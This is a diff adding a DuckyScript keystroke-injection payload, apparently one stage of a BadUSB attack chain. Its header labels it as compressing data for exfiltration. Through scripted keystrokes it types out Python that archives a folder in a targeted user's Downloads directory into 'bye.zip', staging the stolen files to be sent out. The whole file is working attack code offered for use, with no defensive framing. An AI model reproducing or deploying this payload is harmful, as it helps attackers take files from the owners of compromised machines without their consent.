@@ -1,0 +1,92 @@
+REM #######################################################
+REM #                                                     #
+REM #      PART 5.0 COMPRESS DATA FOR EXFULTRATION        #
+REM #                                                     #
+REM #######################################################
+
+
+DELAY 1000 
+ENTER 
+DELAY 500
+ENTER 
+DELAY 400
+ENTER 
+
+DELAY 400 
+STRING import shutil
+DELAY 400
+ENTER 
+DELAY 140 
+STRING import os
+DELAY 400
+ENTER
+DELAY 200
+ENTER
+DELAY 200
+
+STRING def compress_and_rename_folder(folder_path):
+DELAY 190 
+SHIFT ENTER 
+DELAY 180 
+STRING     zip_file_name = 'bye.zip'
+DELAY 160 
+ENTER 
+DELAY 140 
+STRING     zip_file_path = os.path.join(os.path.dirname(folder_path), zip_file_name)
+DELAY 230 
+ENTER 
+DELAY 140 
+STRING     shutil.make_archive(base_name=zip_file_path.replace('.zip', ''), format='zip', root_dir=folder_path)
+DELAY 250
+ENTER 
+DELAY 140 
+STRING     original_zip_path = zip_file_path.replace('.zip', '') + '.zip'
+DELAY 200
+ENTER 
+DELAY 140
+STRING     if os.path.exists(original_zip_path):
+DELAY 160
+ENTER 
+DELAY 140 
+STRING         os.rename(original_zip_path, zip_file_path)
+DELAY 190
+ENTER 
+DELAY 140 
+STRING         print(f"Compressed file created and renamed to: {zip_file_path}")
+DELAY 200
+ENTER 
+DELAY 140 
+STRING     else:
+DELAY 140 
+ENTER 
+DELAY 140 
+STRING         print("Failed to create the zip file.")
+DELAY 180 
+ENTER 
+DELAY 140
+ENTER 
+DELAY 140 
+
+REM PART 2 OF 5.0
+
+ENTER 
+DELAY 140 
+STRING hi_folder_path = f"C:\\Users\\{selected_user}\\Downloads\\hi"
+DELAY 200 
+ENTER 
+DELAY 140
+DELAY 140 
+ENTER 
+DELAY 140 
+
+REM PART 3 OF 5.0
+
+ENTER 
+DELAY 140 
+STRING compress_and_rename_folder(hi_folder_path)
+DELAY 190 
+ENTER 
+DELAY 140
+ENTER 
+DELAY 140 
+ENTER
